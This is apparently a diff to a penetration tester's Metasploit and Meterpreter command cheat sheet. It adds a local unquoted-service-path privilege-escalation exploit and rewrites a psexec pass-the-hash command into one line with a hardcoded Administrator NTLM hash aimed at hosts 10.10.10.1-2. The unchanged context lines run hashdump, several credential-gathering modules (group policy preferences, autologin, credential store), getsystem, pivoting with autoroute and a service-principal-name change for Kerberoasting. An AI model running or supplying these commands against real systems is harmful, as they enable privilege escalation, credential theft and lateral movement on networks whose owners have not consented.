@@ -395,6 +395,9 @@ sysinfo
 execute -H -i -f powershell.exe -a "-Command Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 arp
 ipconfig
+load exploit
+load priv
+run exploit/windows/local/unquoted_service_path LHOST=eth1
 run post/windows/gather/enum_domain
 run post/windows/gather/enum_domains
 run post/windows/gather/enum_unattend
@@ -402,7 +405,6 @@ run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/gpp
 run post/windows/gather/credentials/windows_autologin
 hashdump
-use priv
 getsystem
 cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
 reload_all
@@ -425,10 +427,4 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 run post/multi/manage/autoroute
 run post/multi/manage/autoroute ACTION=delete
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
-background
-use exploit/windows/smb/psexec
-set LHOST 10.10.10.3
-set RHOSTS 10.10.10.1-2
-set SMBUser Administrator
-set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
-run
+run exploit/windows/smb/psexec LHOST=10.10.10.3 RHOSTS=10.10.10.1-2 SMBUser=Administrator SMBPass=be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
